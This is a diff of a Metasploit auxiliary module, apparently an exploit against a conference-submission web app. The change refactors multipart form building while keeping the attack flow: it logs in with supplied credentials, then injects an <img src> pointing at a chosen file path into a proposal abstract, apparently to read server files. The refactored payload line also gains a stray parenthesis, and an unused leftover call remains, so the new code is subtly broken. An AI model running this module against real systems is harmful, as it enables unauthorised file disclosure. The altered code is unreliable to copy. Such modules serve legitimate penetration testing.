@@ -94,58 +94,28 @@ class MetasploitModule < Msf::Auxiliary
 
     @proposal_name = Rex::Text.rand_text_alphanumeric(10)
 
-    boundary = Rex::Text.rand_text_alphanumeric(16).to_s
-    data_post = "------WebKitFormBoundary#{boundary}\r\n"
+    data_post = Rex::MIME::Message.new
 
-    data_post << "Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\n"
-    data_post << "#{csrf_token}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"title\"\r\n\r\n"
-    data_post << "#{@proposal_name}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"submission_type\"\r\n\r\n"
-    data_post << "#{submission_type}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"content_locale\"\r\n\r\n"
-    data_post << "en\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"abstract\"\r\n\r\n"
-    data_post << %(<img src="#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}"/>\r\n)
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"description\"\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"notes\"\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"image\";filename=\"\"\r\n"
-    data_post << "Content-Type: application/octet-stream\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"additional_speaker\"\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
+    data_post.add_part(csrf_token, '', '', %(form-data; name="csrfmiddlewaretoken"))
+    data_post.add_part(@proposal_name, '', '', %(form-data; name="title"))
+    data_post.add_part(submission_type, '', '', %(form-data; name="submission_type"))
+    data_post.add_part('en', '', '', %(form-data; name="content_locale"))
+    data_post.add_part(%<(<img src="#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}"/>>, '', '', %(form-data; name="abstract"))
+    data_post.add_part('', '', '', %(form-data; name="description"))
+    data_post.add_part('', '', '', %(form-data; name="notes"))
+    data_post.add_part('', 'application/octet-stream', '', %(form-data; name="image"; filename=""))
+    data_post.add_part('', '', '', %(form-data; name="additional_speaker"))
 
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(submit_uri),
-      'data' => data_post,
-      'ctype' => "multipart/form-data; boundary=----WebKitFormBoundary#{boundary}"
+      'data' => data_post.to_s,
+      'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
     })
 
-    #===============================================================================
-
     fail_with Failure::UnexpectedReply unless res&.code == 302
-
     submit_uri = res.headers.fetch('Location', nil)
+
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(submit_uri),
@@ -158,51 +128,27 @@ class MetasploitModule < Msf::Auxiliary
 
     fail_with Failure::Unknown unless submit_uri && csrf_token
 
-    boundary = Rex::Text.rand_text_alphanumeric(16).to_s
-
-    data_post = "------WebKitFormBoundary#{boundary}\r\n"
-    data_post << "Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\n"
-    data_post << "#{csrf_token}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-    data_post << "Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\n"
-    data_post << "#{csrf_token}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"login_email\"\r\n\r\n"
-    data_post << "#{datastore['USERNAME']}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"login_password\"\r\n\r\n"
-    data_post << "#{datastore['PASSWORD']}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"register_name\"\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"register_email\"\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"register_password\"\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"register_password_repeat\"\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-    #================================================================================
+    data_post = Rex::MIME::Message.new
+    data_post.add_part(csrf_token, nil, nil, %(form-data; name="csrfmiddlewaretoken"))
+    data_post.add_part(csrf_token, nil, nil, %(form-data; name="csrfmiddlewaretoken"))
+    data_post.add_part(datastore['USERNAME'], '', '', %(form-data; name="login_email"))
+    data_post.add_part(datastore['PASSWORD'], '', '', %(form-data; name="login_password"))
+    data_post.add_part('', '', '', %(form-data; name="register_name"))
+    data_post.add_part('', '', '', %(form-data; name="register_email"))
+    data_post.add_part('', '', '', %(form-data; name="register_password"))
+    data_post.add_part('', '', '', %(form-data; name="register_password_repeat"))
 
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(submit_uri),
-      'data' => data_post,
-      'ctype' => "multipart/form-data; boundary=----WebKitFormBoundary#{boundary}"
+      'data' => data_post.to_s,
+      'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
     })
 
     fail_with Failure::UnexpectedReply unless res&.code == 302
 
     submit_uri = res.headers.fetch('Location', nil)
+
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(submit_uri),
@@ -215,37 +161,20 @@ class MetasploitModule < Msf::Auxiliary
 
     fail_with Failure::Unknown unless submit_uri && csrf_token
 
-    boundary = Rex::Text.rand_text_alphanumeric(16).to_s
+    Rex::Text.rand_text_alphanumeric(16).to_s
 
-    data_post = "------WebKitFormBoundary#{boundary}\r\n"
-    data_post << "Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\n"
-    data_post << "#{csrf_token}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"avatar\";filename=\"\"\r\n"
-    data_post << "Content-Type: application/octet-stream\r\n\r\n"
-    data_post << "\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"name\"\r\n\r\n"
-    data_post << "#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"biography\"\r\n\r\n"
-    data_post << "#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    data_post << "Content-Disposition: form-data; name=\"availabilities\"\r\n\r\n"
-    data_post << %({"availabilities":[]}\r\n)
-    data_post << "------WebKitFormBoundary#{boundary}\r\n"
-
-    #=============================================================================
+    data_post = Rex::MIME::Message.new
+    data_post.add_part(csrf_token, '', '', %(form-data; name="csrfmiddlewaretoken"))
+    data_post.add_part('', 'application/octet-stream', '', %(form-data; name="avatar"; filename=""))
+    data_post.add_part(Rex::Text.rand_text_alphanumeric(10), '', '', %(form-data; name="name"))
+    data_post.add_part(Rex::Text.rand_text_alphanumeric(10), '', '', %(form-data; name="biography"))
+    data_post.add_part(%({"availabilities":[]}), '', '', %(form-data; name="availabilities"))
 
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(submit_uri),
-      'data' => data_post,
-      'ctype' => "multipart/form-data; boundary=----WebKitFormBoundary#{boundary}"
+      'data' => data_post.to_s,
+      'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
     })
 
     fail_with Failure::UnexpectedReply unless res&.code == 302
@@ -358,7 +287,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check_host(_ip)
-    return Exploit::CheckCode::Unknown, 'Login failed, please check credentials' unless login
+    return Exploit::CheckCode::Unknown('Login failed, please check credentials') unless login
 
     res = send_request_cgi({
       'method' => 'GET',
